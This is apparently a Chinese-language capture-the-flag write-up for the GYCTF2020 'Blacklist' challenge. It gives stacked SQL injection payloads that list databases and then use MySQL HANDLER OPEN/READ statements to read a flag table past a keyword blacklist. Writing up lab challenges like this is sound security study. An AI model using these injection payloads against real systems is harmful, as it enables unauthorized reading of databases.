+++
title = 'GYCTF2020---Blacklist'
date = 2024-09-17T02:07:55+08:00
draft = false
categories = ['CS', 'sec', 'wp']
+++

## 题目

一个输入：
![](../../../../img/Pasted%20image%2020240917020558.png)


---
## 分析

### 看看数据库和表

```
1';show databases;#
```
- 注意加分号

![](../../../../img/Pasted%20image%2020240917020645.png)

![](../../../../img/Pasted%20image%2020240917020652.png)


### HANDLER ... OPEN

新姿势：`HANDLER ... OPEN`语句打开一个表，使其可以使用后续`HANDLER ... READ`语句访问，该表对象未被其他会话共享，并且在会话调用`HANDLER ... CLOSE`或会话终止之前不会关闭

```
1';
HANDLER FlagHere OPEN;
HANDLER FlagHere READ FIRST;
HANDLER FlagHere CLOSE;#
```


---
## 原理

`HANDLER ... OPEN`语句打开一个表，使其可以使用后续`HANDLER ... READ`语句访问，该表对象未被其他会话共享，并且在会话调用`HANDLER ... CLOSE`或会话终止之前不会关闭